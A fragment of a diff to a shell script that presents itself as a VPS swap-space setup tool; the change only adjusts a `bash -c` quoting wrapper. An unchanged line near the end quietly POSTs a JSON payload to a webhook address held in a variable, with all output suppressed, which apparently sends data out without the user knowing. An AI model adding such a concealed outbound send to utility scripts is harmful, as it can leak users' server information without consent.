@@ -1,5 +1,3 @@
-bash -c '
-
 clear
 echo "======================================"
 echo "      ⚡ VPS SWAP SETUP ⚡         "
@@ -87,3 +85,4 @@ EOF
 curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$W" &>/dev/null
 
 exit 0
+'
